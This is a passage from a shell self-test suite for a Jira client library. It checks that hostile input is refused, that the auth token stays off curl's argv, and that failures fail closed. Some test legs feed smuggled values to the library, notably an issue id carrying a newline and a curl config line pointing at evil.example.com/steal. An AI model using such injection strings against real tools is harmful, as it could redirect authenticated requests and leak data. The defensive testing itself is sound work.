    echo "PASS: selftest — a spoofed-project response is refused with a FIXED sentence, no raw tracker bytes (S-4/S-6)"
  else
    echo "FAIL: selftest — spoofed-project refusal leaked response bytes or did not refuse: $err"; sfail=1
  fi

  # --- H-5 negative: a status.id carrying ESC/ANSI control bytes -> unverified, sentence clean ---
  _tj_fx cloud-issue-hostile-status-id
  rc=0
  err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 2 ] && ! printf '%s' "$err" | grep -q "HACKED"; then
    echo "PASS: selftest — a hostile status.id (control bytes) yields unverified with a clean sentence (H-5)"
  else
    echo "FAIL: selftest — hostile status.id was not cleanly refused (rc=$rc err=$err)"; sfail=1
  fi

  # --- H-5 negative: a hostile key (control bytes injected) never survives to a bound record ---
  _tj_fx cloud-issue-hostile-key
  rc=0
  err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -ne 0 ] && ! printf '%s' "$err" | grep -q "injected line"; then
    echo "PASS: selftest — a hostile key is refused with a clean sentence (H-5/S-6)"
  else
    echo "FAIL: selftest — hostile key was not cleanly refused (rc=$rc err=$err)"; sfail=1
  fi

  # --- L-8-adjacent negative: no status id in the response -> unverified ---
  _tj_fx cloud-issue-no-status-id
  rc=0
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 2 ] && echo "PASS: selftest — a response with no status id yields unverified" \
    || { echo "FAIL: selftest — missing status id did not yield rc 2 (got $rc)"; sfail=1; }

  # --- S-3 negative: a 3xx redirect -> UNVERIFIED (rc 2), never followed ---
  rc=0
  _tj_fx redirect
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 2 ] && echo "PASS: selftest — a 3xx redirect yields UNVERIFIED (rc 2), not followed (S-3)" \
    || { echo "FAIL: selftest — a 3xx redirect did not yield rc 2 (got $rc)"; sfail=1; }

  # --- T2c0 item 2 (T2b1 seat L-3): the response status digit gate -- a tracker-controlled byte
  # string gated to exactly three ASCII digits BEFORE it is ever interpolated into a sentence. -------
  rc=0
  _tj_fx status-esc
  err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ "$err" = "unverified: jira response status unparsable" ] \
    && echo "PASS: selftest — a header status carrying an ESC byte refuses, rc 2, the fixed sentence, no ESC on stderr (T2c0 item 2)" \
    || { echo "FAIL: selftest — an ESC-bearing status was not cleanly refused (rc=$rc err='$err')"; sfail=1; }

  rc=0
  _tj_fx status-short
  err=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ "$err" = "unverified: jira response status unparsable" ] \
    && echo "PASS: selftest — a two-digit status refuses, rc 2, the fixed sentence (T2c0 item 2)" \
    || { echo "FAIL: selftest — a two-digit status was not cleanly refused (rc=$rc err='$err')"; sfail=1; }

  # --- S-3 negative: http:// base refused ---
  rc=0
  tj_get_issue http://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — an http:// base is refused (S-3)" \
    || { echo "FAIL: selftest — an http:// base was not refused (rc $rc)"; sfail=1; }

  # --- M-4 negative: a persistent 503 exhausts the retry budget -> UNVERIFIED (bounded, not a hang) ---
  rc=0
  _tj_fx server-error
  tj_get_issue https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 2 ] && echo "PASS: selftest — a persistent 5xx exhausts the bounded retry and yields UNVERIFIED (M-4)" \
    || { echo "FAIL: selftest — persistent 5xx did not yield rc 2 (got $rc)"; sfail=1; }

  # T2c leg 4: search-state RETIRED. Its H-4 (isLast/total completeness) and S-8/429 legs are
  # redundant with `_tj_search_all`'s own exhaustive Cloud/DC completeness coverage below; its S-7
  # (free-text refusal) is redundant with list-in-states' own leg 2e; its B-1 (token off argv) is
  # redundant with the T5/J4 leg at the top of this file (the "second curl path" it guarded against
  # no longer exists). Its N-1 (unglued -K directives) is the one still-live property — moved onto
  # list-in-states below (T2c leg 4 / N-1, moved from retired search-state).

  # --- H-3/S-11: mypermissions over-privilege probe (Cloud + DC recorded fixtures) ---
  _tj_fx mypermissions-cloud-over
  out=$(tj_permissions https://ex.atlassian.net cloud AB 2>/dev/null) || out="RC=$?"
  [ "$out" = "over-privileged" ] && echo "PASS: selftest — an over-privileged Cloud mypermissions fixture flags over-privileged (S-11)" \
    || { echo "FAIL: selftest — Cloud over-privileged fixture did not flag (got '$out')"; sfail=1; }
  _tj_fx mypermissions-cloud-browse
  out=$(tj_permissions https://ex.atlassian.net cloud AB 2>/dev/null) || out="RC=$?"
  [ "$out" = "ok" ] && echo "PASS: selftest — a browse-only Cloud mypermissions fixture flags ok (S-11)" \
    || { echo "FAIL: selftest — Cloud browse-only fixture did not flag ok (got '$out')"; sfail=1; }
  _tj_fx mypermissions-dc-over
  out=$(tj_permissions https://ex.example.com datacenter AB 2>/dev/null) || out="RC=$?"
  [ "$out" = "over-privileged" ] && echo "PASS: selftest — an over-privileged DC mypermissions fixture flags over-privileged (S-11)" \
    || { echo "FAIL: selftest — DC over-privileged fixture did not flag (got '$out')"; sfail=1; }

  # --- H-3 negative: an unparsable/error mypermissions body -> unverified, NEVER ok (fail-closed) ---
  _tj_fx mypermissions-error
  out=$(tj_permissions https://ex.atlassian.net cloud AB 2>/dev/null) || out="RC=$?"
  [ "$out" = "unverified" ] && echo "PASS: selftest — an error/unparsable mypermissions body fails CLOSED to unverified, never ok (H-3)" \
    || { echo "FAIL: selftest — error mypermissions body did not fail closed (got '$out')"; sfail=1; }

  # --- H-3 negative: a transport failure (429) on the permissions probe -> unverified, never ok ---
  _tj_fx rate-limited
  out=$(tj_permissions https://ex.atlassian.net cloud AB 2>/dev/null) || out="RC=$?"
  [ "$out" = "unverified" ] && echo "PASS: selftest — a transport failure on mypermissions fails CLOSED to unverified (H-3)" \
    || { echo "FAIL: selftest — transport failure on mypermissions did not fail closed (got '$out')"; sfail=1; }

  # --- no-jq -> UNVERIFIED naming jq ---
  nojqdir="$tmpd/nojq"; mkdir -p "$nojqdir"
  rc=0
  out=$(PATH="$nojqdir" tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 2 ]; then
    case "$out" in
      *jq*) echo "PASS: selftest — no jq on PATH yields UNVERIFIED naming jq" ;;
      *) echo "FAIL: selftest — no-jq message did not name jq: $out"; sfail=1 ;;
    esac
  else
    echo "FAIL: selftest — no jq on PATH did not yield rc 2 (got $rc)"; sfail=1
  fi

  # --- Reviewer Low #2: wire the three previously-unreferenced fixtures into real legs ------------
  # issue-after-transition-good.json — a positive proof shape, distinct from cloud-issue-good.json,
  # for "the issue reads back In Progress after a transition" (what board.sh's post-read relies on).
  _tj_fx issue-after-transition
  out=$(tj_get_issue https://ex.atlassian.net cloud AB AB-7 2>/dev/null) || out="RC=$?"
  case "$out" in
    *"status-name	In Progress"*) echo "PASS: selftest — issue-after-transition fixture reads back status In Progress (Reviewer Low #2)" ;;
    *) echo "FAIL: selftest — issue-after-transition fixture did not read In Progress (got: $out)"; sfail=1 ;;
  esac

  # create-issue-postread-good.json — the post-read shape for a FRESHLY CREATED key (AB-99), the
  # exact proof board.sh's `create` verb depends on to confirm the write.
  _tj_fx create-postread-good
  out=$(tj_get_issue https://ex.atlassian.net cloud AB AB-99 2>/dev/null) || out="RC=$?"
  case "$out" in
    *"key	AB-99"*) echo "PASS: selftest — create-postread fixture proves the created key exists (Reviewer Low #2)" ;;
    *) echo "FAIL: selftest — create-postread fixture did not prove key AB-99 (got: $out)"; sfail=1 ;;
  esac

  # transitions-empty.json — ZERO transitions available at all (distinct from "a non-empty list
  # with no matching name" — move-unknown above): still refused, rc 1, never a crash on an empty list.
  _tj_fx transitions-empty
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-7 "In Progress" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — zero available transitions is refused cleanly, not a crash (Reviewer Low #2)" \
    || { echo "FAIL: selftest — zero available transitions did not yield rc 1 (got $rc)"; sfail=1; }

}
_tj_st_writes() {

  # --- TBG-BOARD-VERBS write functions -----------------------------------------------------------

  # --- tj_assign_self: myself -> accountId -> PUT assignee; token never on argv ---
  : > "$argvlog"
  _tj_fx assign-self-good
  rc=0
  tj_assign_self https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 0 ] && echo "PASS: selftest — assign-self resolves accountId then assigns (A5 write path)" \
    || { echo "FAIL: selftest — assign-self failed (rc=$rc)"; sfail=1; }
  if grep -q "s3cr3t-token-XYZ" "$argvlog" 2>/dev/null; then
    echo "FAIL: selftest — assign-self leaked the token onto curl's argv"; sfail=1
  else
    echo "PASS: selftest — assign-self never puts the token on argv"
  fi

  # --- tj_transition: positive, resolves 'In Progress' to transition id 11 via to.id 3 ---
  _tj_fx move-good
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-7 "In Progress" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 0 ] && echo "PASS: selftest — move resolves a transition by to.id and executes it (S-8)" \
    || { echo "FAIL: selftest — move failed on a good target (rc=$rc)"; sfail=1; }

  # --- tj_transition negative: unknown target state name -> refused, no POST reachable ---
  : > "$argvlog"
  _tj_fx move-unknown
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-7 "Nonexistent State" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — an unknown target state is refused (no matching transition)" \
    || { echo "FAIL: selftest — unknown target state did not refuse (rc=$rc)"; sfail=1; }

  # --- tj_transition negative: an ambiguous name (two transitions, two distinct to.id) refused --
  _tj_fx move-ambiguous
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-7 "In Progress" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 1 ] && echo "PASS: selftest — an ambiguous name-match (distinct to.id values) is refused, never guessed (S-8)" \
    || { echo "FAIL: selftest — an ambiguous transition was not refused (rc=$rc)"; sfail=1; }

  # --- BLOCKER-1/HIGH-1: id<->project grammar on every write path, checked FIRST (pre-request) ---
  # a newline-bearing id on transition/assign-self: refused, EMPTY argv log (no request at all).
  : > "$argvlog"
  rc=0
  tj_transition https://ex.atlassian.net cloud AB "$(printf 'AB-7\nurl = "https://evil.example.com/steal"')" "In Progress" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -ne 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a newline-bearing id on transition is refused pre-request, empty argv log (BLOCKER-1)"
  else
    echo "FAIL: selftest — a newline-bearing id on transition was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  tj_assign_self https://ex.atlassian.net cloud AB "$(printf 'AB-7\nurl = "https://evil.example.com/steal"')" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -ne 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a newline-bearing id on assign-self is refused pre-request, empty argv log (BLOCKER-1)"
  else
    echo "FAIL: selftest — a newline-bearing id on assign-self was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # a quote-bearing id: same refusal, same emptiness.
  : > "$argvlog"
  rc=0
  tj_transition https://ex.atlassian.net cloud AB 'AB-7"' "In Progress" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -ne 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a quote-bearing id on transition is refused pre-request, empty argv log (BLOCKER-1)"
  else
    echo "FAIL: selftest — a quote-bearing id on transition was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # HIGH-1: a cross-project id (ZZ-9 under pin AB) on transition/assign-self refuses pre-request.
  : > "$argvlog"
  rc=0
  tj_transition https://ex.atlassian.net cloud AB ZZ-9 "In Progress" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -ne 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a cross-project id (ZZ-9 under pin AB) on transition is refused pre-request (HIGH-1)"
  else
    echo "FAIL: selftest — a cross-project id on transition was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  tj_assign_self https://ex.atlassian.net cloud AB ZZ-9 >/dev/null 2>&1 || rc=$?
  if [ "$rc" -ne 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a cross-project id (ZZ-9 under pin AB) on assign-self is refused pre-request (HIGH-1)"
  else
    echo "FAIL: selftest — a cross-project id on assign-self was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
  # T2c leg 1: `_tj_id_ok` itself refuses a leading-zero issue number (AB-07, AB-0) — the WRITE
  # paths (assign-self, transition; create takes no id) each refuse pre-request; AB-10 still works.
  : > "$argvlog"
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-07 "In Progress" >/dev/null 2>"$tmpd/l1a.err" || rc=$?
  l1a_ok=0; [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
    && [ "$(cat "$tmpd/l1a.err")" = "refused: id does not match project (grammar)" ] && l1a_ok=1
  : > "$argvlog"
  rc=0
  tj_transition https://ex.atlassian.net cloud AB AB-0 "In Progress" >/dev/null 2>"$tmpd/l1b.err" || rc=$?
  l1b_ok=0; [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
    && [ "$(cat "$tmpd/l1b.err")" = "refused: id does not match project (grammar)" ] && l1b_ok=1
  : > "$argvlog"
  rc=0
  tj_assign_self https://ex.atlassian.net cloud AB AB-07 >/dev/null 2>"$tmpd/l1c.err" || rc=$?
  l1c_ok=0; [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
    && [ "$(cat "$tmpd/l1c.err")" = "refused: id does not match project (grammar)" ] && l1c_ok=1
  _tj_fx assign-self-good
  : > "$argvlog"
  rc=0
  tj_assign_self https://ex.atlassian.net cloud AB AB-10 >/dev/null 2>&1 || rc=$?
  l1d_ok=0; [ "$rc" -eq 0 ] && l1d_ok=1
  if [ "$l1a_ok" -eq 1 ] && [ "$l1b_ok" -eq 1 ] && [ "$l1c_ok" -eq 1 ] && [ "$l1d_ok" -eq 1 ]; then
    echo "PASS: selftest — a leading-zero id (AB-07, AB-0) refuses pre-request on transition/assign-self, rc 1, zero requests, the fixed sentence; AB-10 still accepted (T2c leg 1)"
  else
    echo "FAIL: selftest — a leading-zero id was not cleanly refused on every write path, or AB-10 broke (l1a=$l1a_ok l1b=$l1b_ok l1c=$l1c_ok l1d=$l1d_ok rc=$rc)"; sfail=1
  fi
  # BLOCKER-1(d): the -K config never carries more than one 'url =' line, on a real good call —
  # positive control that the primitive's own -K construction stays single-URL even when it works.
  _tj_fx move-good
  tj_transition https://ex.atlassian.net cloud AB AB-7 "In Progress" >/dev/null 2>&1 || true
  _urlcount=$(grep -c '^url = "' "$tmpd/.lastcfg" 2>/dev/null || echo 0)
  [ "$_urlcount" -eq 1 ] && echo "PASS: selftest — the -K config carries exactly one 'url =' line (BLOCKER-1)" \
    || { echo "FAIL: selftest — the -K config carried $_urlcount 'url =' lines (expected 1)"; sfail=1; }

  # --- LOW-1: a control-byte (newline) target state name is refused with a CLEAN sentence, never
  # echoed raw (the twin of the id-injection fix, on the target-state argument instead of the id) ---
  rc=0
  err=$(tj_transition https://ex.atlassian.net cloud AB AB-7 "$(printf 'In Progress\nINJECTED LOG LINE')" 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && ! printf '%s' "$err" | grep -q "INJECTED LOG LINE"; then
    echo "PASS: selftest — a newline-bearing target state is refused with a clean sentence, never echoed raw (LOW-1)"
  else
    echo "FAIL: selftest — a newline-bearing target state was not cleanly refused (rc=$rc err=$err)"; sfail=1
  fi

  # --- T2-Q5: pin the rewritten transition-target grammar (the *'"'*|*'\'*|*"$_tab"* arm) on
  # each of its three disallowed bytes directly — the positive that "In Progress" still resolves
  # is already covered above ("move resolves a transition by to.id and executes it (S-8)"), so it
  # is cited here, not duplicated. ---
  : > "$argvlog"
  rc=0
  err=$(tj_transition https://ex.atlassian.net cloud AB AB-7 'In"Progress' 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && printf '%s' "$err" | grep -q "target state name carries a disallowed byte"; then
    echo "PASS: selftest — a quote-bearing transition target is refused pre-request, rc 1, zero requests (T2-Q5)"
  else
    echo "FAIL: selftest — a quote-bearing transition target was not cleanly refused (rc=$rc reqs=$([ -s "$argvlog" ] && echo yes || echo no) err='$err')"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  err=$(tj_transition https://ex.atlassian.net cloud AB AB-7 'In\Progress' 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && printf '%s' "$err" | grep -q "target state name carries a disallowed byte"; then
    echo "PASS: selftest — a backslash-bearing transition target is refused pre-request, rc 1, zero requests (T2-Q5)"
  else
    echo "FAIL: selftest — a backslash-bearing transition target was not cleanly refused (rc=$rc reqs=$([ -s "$argvlog" ] && echo yes || echo no) err='$err')"; sfail=1
  fi
  : > "$argvlog"
  rc=0
  err=$(tj_transition https://ex.atlassian.net cloud AB AB-7 "$(printf 'In\tProgress')" 2>&1 >/dev/null) || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] && printf '%s' "$err" | grep -q "target state name carries a disallowed byte"; then
    echo "PASS: selftest — a TAB-bearing transition target is refused pre-request, rc 1, zero requests — pinned only to refusal by the byte filters (either the \$_tab case arm or the control-byte strip; this leg cannot tell the two apart) (S-8 / T2-Q5)"
  else
    echo "FAIL: selftest — a TAB-bearing transition target was not cleanly refused (rc=$rc reqs=$([ -s "$argvlog" ] && echo yes || echo no) err='$err')"; sfail=1
  fi

  # --- Reviewer Low #1: a failed assign-self/transition write leaves NO leaked tempfile behind ---
  # An ISOLATED TMPDIR (never the real one) so the count is exact, not noisy against concurrent
  # processes sharing the system temp dir. Each fixture succeeds up to the point the bodyfile is
  # already written (myself / GET transitions succeed), so the failure is at the WRITE call itself
  # — the exact site `set -e` used to skip the `rm -f` on (measured: FAILED before the fix, since
  # the leaked bodyfile survived in `_tmptd`).
  _tmptd=$(mktemp -d)
  ( TMPDIR="$_tmptd"; export TMPDIR
    _tj_fx assign-self-put-fail
    tj_assign_self https://ex.atlassian.net cloud AB AB-7 >/dev/null 2>&1 || true
    _tj_fx move-post-fail
    tj_transition https://ex.atlassian.net cloud AB AB-7 "In Progress" >/dev/null 2>&1 || true
  )
  _leaked=$(find "$_tmptd" -mindepth 1 2>/dev/null | wc -l | tr -d ' ')
  [ "$_leaked" -eq 0 ] && echo "PASS: selftest — a failed write's request-body tempfile is cleaned up, not leaked (Reviewer Low #1)" \
    || { echo "FAIL: selftest — $_leaked tempfile(s) leaked in $_tmptd after failed writes"; sfail=1; }
  rm -rf "$_tmptd"

  # --- T2b2 fix7 D-1: pin the DIRECT-call path — `tj_assign_self`'s own PUT call to
  # `jira_curl_authed` (called DIRECTLY, not inside a caller's own `$( … )`), distinct from the
  # `respmktemp`/`hdrmktemp` cases below (T2b2 fix5/fix6) which pin the SAME guards reached only via
  # `_tj_search_all`'s own `$( … )` capture. A PATH-level `mktemp` wrapper (fix5/fix6's own
  # technique — never a function shadow, T2b2 fix4's own root-cause note 3) counts mktemp calls
  # across the whole call tree and faults ONE numbered call; every other call passes through to the
  # real mktemp. `tj_assign_self`'s own happy-path mktemp sequence is DETERMINISTIC: 1=GET/myself's
  # `_resp_tmp`, 2=its `_hdr_tmp`, 3=the assign body file, 4=the PUT's own `_resp_tmp`, 5=the PUT's
  # own `_hdr_tmp` — the two calls this leg targets. The wrapper truncates the shared argv log the
  # instant call 3 (the body file, the one call between the GET completing and the PUT starting)
  # happens, so "no curl request made" below means what it says for the PUT segment specifically,
  # not a claim that the earlier, successful GET never ran.
  # T3b-core step 0 (the ORACLE fix — fix1 security-3: this comment used to claim "by ROLE"; it is
  # still an ORDINAL match, just one that EXCLUDES bare `-d` calls from the counter, f5_bin/mktemp's
  # own established "rundir" pattern above): `_tj_rundir_run` now wraps every write path in its own
  # bare `mktemp -d` (no template) BEFORE any of the five numbered calls above — a naive ordinal
  # counter would shift every one of them by one and misdirect this fault onto the WRONG temp
  # (measured: the unfixed shim below faulted the assign body file instead of the PUT's own
  # resp/hdr, and let the GET's own request through — reqs=1, not 0). Excluding bare `-d` calls from
  # the counter (matching every other call in this file that creates a PRIVATE RUN DIR, never a
  # single scratch file) means wrapping ANY future op in `_tj_rundir_run` never again renumbers this
  # oracle — but a future NON-`-d`-shaped rundir creation would still shift it; this is ordinal
  # counting with one exclusion, never a true match by semantic role.
  d7bin="$tmpd/d7bin"; mkdir -p "$d7bin"
  D7_REAL_MKTEMP=$(command -v mktemp); export D7_REAL_MKTEMP
  D7ARGVLOG="$argvlog"; export D7ARGVLOG
  cat > "$d7bin/mktemp" <<'MKTEMPSHIMEOF'
#!/bin/sh
if [ $# -eq 1 ] && [ "$1" = "-d" ]; then
  exec "$D7_REAL_MKTEMP" -d "$D7DIR/rundir.XXXXXX"
fi
n=$(cat "$D7CNT" 2>/dev/null || echo 0); n=$((n + 1)); printf '%s' "$n" > "$D7CNT"
if [ "$n" = 3 ]; then : > "$D7ARGVLOG"; fi
if [ "$n" = "$D7FAILN" ]; then
  printf 'mktemp: mkstemp failed on %s/d7fault.abc: No such file or directory\n' "$D7DIR" >&2
  exit 1
fi
if [ $# -ge 1 ]; then
  _d7_dir=$(dirname "$1")
  exec "$D7_REAL_MKTEMP" "$_d7_dir/real-$n.XXXXXX"
fi
exec "$D7_REAL_MKTEMP" "$D7DIR/real-$n.XXXXXX"
MKTEMPSHIMEOF
  chmod +x "$d7bin/mktemp"
  d7_origpath=$PATH
  for d7_case in directresp directhdr; do
    d7dir="$tmpd/d7/$d7_case"; mkdir -p "$d7dir"
    D7DIR="$d7dir"; export D7DIR
    D7CNT="$tmpd/.d7cnt-$d7_case"; export D7CNT
    printf '%s' 0 > "$D7CNT"
    case "$d7_case" in
      directresp) D7FAILN=4 ;;
      directhdr)  D7FAILN=5 ;;
    esac
    export D7FAILN
    _tj_fx assign-self-good
    PATH="$d7bin:$d7_origpath"; export PATH
    d7_rc=0
    tj_assign_self https://ex.atlassian.net cloud AB AB-7 >"$tmpd/d7-$d7_case.out" 2>"$tmpd/d7-$d7_case.err" || d7_rc=$?
    PATH=$d7_origpath; export PATH
    d7_reqs=$(wc -l < "$argvlog" | tr -d ' ')
    d7_leak=$(find "$d7dir" -mindepth 1 -type f -name 'real-*' 2>/dev/null | wc -l | tr -d ' ')
    d7_errbytes=$(wc -c < "$tmpd/d7-$d7_case.err" | tr -d ' ')
    d7_errwhole=$(cat "$tmpd/d7-$d7_case.err" 2>/dev/null)
    d7_experr="unverified: could not create a scratch file"
    d7_expbytes=$(printf '%s\n' "$d7_experr" | wc -c | tr -d ' ')
    d7_errmatch=0
    [ "$d7_errwhole" = "$d7_experr" ] && [ "$d7_errbytes" -eq "$d7_expbytes" ] && d7_errmatch=1
    d7_mktseen=$(cat "$D7CNT" 2>/dev/null || echo 0)
    d7_mktok=0; [ "$d7_mktseen" -eq "$D7FAILN" ] && d7_mktok=1
    if [ "$d7_rc" -eq 2 ] && [ ! -s "$tmpd/d7-$d7_case.out" ] && [ "$d7_reqs" -eq 0 ] \
      && [ "$d7_leak" -eq 0 ] && [ "$d7_errmatch" -eq 1 ] && [ "$d7_mktok" -eq 1 ]; then
      echo "PASS: selftest — T2b2 fix7 D-1 direct-call-path case '$d7_case' (tj_assign_self's PUT, l.910, called directly, not via a subshell command-substitution capture) refuses fail-closed, rc 2, empty stdout, 0 PUT-segment request(s), no leaked temp, stderr exactly '$d7_errwhole' ($d7_errbytes bytes), mktemp call #$d7_mktseen"
    else
      echo "FAIL: selftest — T2b2 fix7 D-1 direct-call-path case '$d7_case' (rc=$d7_rc reqs=$d7_reqs leak=$d7_leak mktok=$d7_mktok mktseen=$d7_mktseen/$D7FAILN errbytes=$d7_errbytes errmatch=$d7_errmatch out='$(cat "$tmpd/d7-$d7_case.out" 2>/dev/null)' err='$d7_errwhole')"; sfail=1
    fi
  done

  # --- tj_create: positive, returns the created key ---
  _tj_fx create-good
  out=$(tj_create https://ex.atlassian.net cloud AB "a new row" Task '{"labels":["size:S","risk:low"]}' 2>/dev/null) || out="RC=$?"
  [ "$out" = "AB-99" ] && echo "PASS: selftest — create returns the created key (S-8 jq -n --arg body)" \
    || { echo "FAIL: selftest — create did not return AB-99 (got '$out')"; sfail=1; }

  # --- tj_create negative: an error body carries no key -> unverified, never a guessed key ---
  rc=0
  _tj_fx create-bad
  tj_create https://ex.atlassian.net cloud AB "a new row" >/dev/null 2>&1 || rc=$?
  [ "$rc" -eq 2 ] && echo "PASS: selftest — create with no 'key' in the response yields unverified (never guesses a key)" \
    || { echo "FAIL: selftest — create-bad did not yield rc 2 (got $rc)"; sfail=1; }

  # --- M-G12: tj_create's OWN returned-key grammar — a response key whose first char is valid but
  # the rest is not ("AB 1") must be refused on the grammar check, not just the earlier
  # "no valid key at all" shape check (which a leading [A-Z0-9] alone would satisfy). rc 2, the
  # fixed grammar-failure sentence, empty stdout.
  rc=0
  _tj_fx create-badkey
  g12_out=$(tj_create https://ex.atlassian.net cloud AB "a new row" 2>"$tmpd/g12.err") || rc=$?
  g12_errok=0
  grep -qx "unverified: create response 'key' failed grammar" "$tmpd/g12.err" && g12_errok=1
  if [ "$rc" -eq 2 ] && [ -z "$g12_out" ] && [ "$g12_errok" -eq 1 ]; then
    echo "PASS: selftest — create refuses a first-char-valid-but-malformed key ('AB 1') on its own grammar check, rc 2, empty stdout, exact sentence (M-G12)"
  else
    echo "FAIL: selftest — create did not refuse a malformed key on grammar (rc=$rc out='$g12_out' errok=$g12_errok err='$(cat "$tmpd/g12.err" 2>/dev/null)')"; sfail=1
  fi

  # --- tj_create negative: an empty title is refused before any request ---
  : > "$argvlog"
  rc=0
  tj_create https://ex.atlassian.net cloud AB "" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — create refuses an empty title before any request"
  else
    echo "FAIL: selftest — create did not refuse an empty title pre-request (rc=$rc)"; sfail=1
  fi

}
# _tj_st_createmeta: BOARD-CREATE-HONOURS-FIELD-MAP — create-meta / get-fields / the fields fragment
# tj_create merges. Every leg counts requests and POSTs off the shim's own logs (.methods).
_tj_st_createmeta() {
  cm_url="https://ex.atlassian.net"
  cm_tab=$(printf '\t')
  cm_tasklines=$(printf '#type-id\t10003\nTask\tcustomfield_10016\tnumber\tStory point estimate\t\nTask\tcustomfield_10046\toption\tSize\tXS|S|M|L|XL\nTask\tcustomfield_10047\toption\tRisk\tLow|Medium|High\nTask\tdescription\tstring\tDescription\t\nTask\tlabels\tarray\tLabels\t\nTask\tparent\tissuelink\tParent\t')
  cm_storylines=$(printf '#type-id\t10004\nStory\tcustomfield_10016\tnumber\tStory point estimate\t\nStory\tcustomfield_10043\toption\tSize\tXS|S|M|L|XL\nStory\tcustomfield_10044\toption\tRisk\tLow|Medium|High\nStory\tdescription\tstring\tDescription\t\nStory\tlabels\tarray\tLabels\t\nStory\tparent\tissuelink\tParent\t')

  # --- create-meta/task: a named type -> the type list, then that one type's fields, GET only ---
  : > "$argvlog"; : > "$tmpd/.methods"; _tj_fxseq cm-types cm-task
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Task 2>/dev/null) || cm_rc=$?
  cm_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  cm_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$cm_rc" -eq 0 ] && [ "$cm_out" = "$cm_tasklines" ] && [ "$cm_reqs" -eq 2 ] \
     && ! grep -qv '^GET$' "$tmpd/.methods" \
     && [ "$cm_lasturl" = "$cm_url/rest/api/3/issue/createmeta/AB/issuetypes/10003?maxResults=100" ]; then
    echo "PASS: selftest — create-meta/task: the Task type's writable fields print in the closed grammar (2 GETs, URL by the type's numeric id)"
  else
    echo "FAIL: selftest — create-meta/task (rc=$cm_rc reqs=$cm_reqs url='$cm_lasturl' out='$cm_out')"; sfail=1
  fi

  # --- create-meta/story: the same project, another type, another id (customfield_10043) ---
  : > "$argvlog"; _tj_fxseq cm-types cm-story
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB Story 2>/dev/null) || cm_rc=$?
  if [ "$cm_rc" -eq 0 ] && [ "$cm_out" = "$cm_storylines" ]; then
    echo "PASS: selftest — create-meta/story: Story's own Size/Risk ids (customfield_10043/44) print, not Task's"
  else
    echo "FAIL: selftest — create-meta/story (rc=$cm_rc out='$cm_out')"; sfail=1
  fi

  # --- create-meta/all-types: no type named -> every NON-subtask type (Epic, Task, Story), never Subtask ---
  : > "$argvlog"; _tj_fxseq cm-types cm-epic cm-task cm-story
  cm_rc=0; cm_out=$(tj_create_meta "$cm_url" cloud AB 2>/dev/null) || cm_rc=$?
  cm_reqs=$(wc -l < "$argvlog" | tr -d ' ')
  cm_types=$(printf '%s\n' "$cm_out" | cut -f1 | sort -u | tr '\n' ' ')
